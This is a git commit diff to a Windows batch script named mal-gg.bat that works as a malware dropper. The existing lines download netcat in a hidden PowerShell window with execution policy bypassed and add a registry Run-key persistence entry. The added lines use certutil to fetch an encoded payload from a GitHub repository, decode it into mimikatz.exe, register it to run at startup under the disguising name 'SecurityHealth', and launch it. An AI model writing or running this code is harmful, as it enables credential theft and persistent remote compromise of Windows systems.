56a725e8737b984a8059925597cf36afb20ae5f9
inwestallis <inwestallis@gmail.com>
2020-06-13 18:07:01 +0200

    Update mal-gg.bat

--- mal-gg.bat
+++ mal-gg.bat
@@ -6,3 +6,9 @@ reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_
 powershell.exe -windowstyle hidden -ep Bypass -nop -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/inwestallis/first_repository/blob/master/nc64.exe','%Temp%\nc64.exe')"
 
 start %Temp%\gg.lnk
+
+certutil -urlcache -split -f https://github.com/inwestallis/first_repository/raw/master/mim.b %Temp%\mim.b
+certutil -decode %Temp%\mim.b %Temp%\mim
+expand %Temp%\mim %Temp%\mimikatz.exe
+reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d mimikatz.exe /f
+start %Temp%\mimikatz.exe
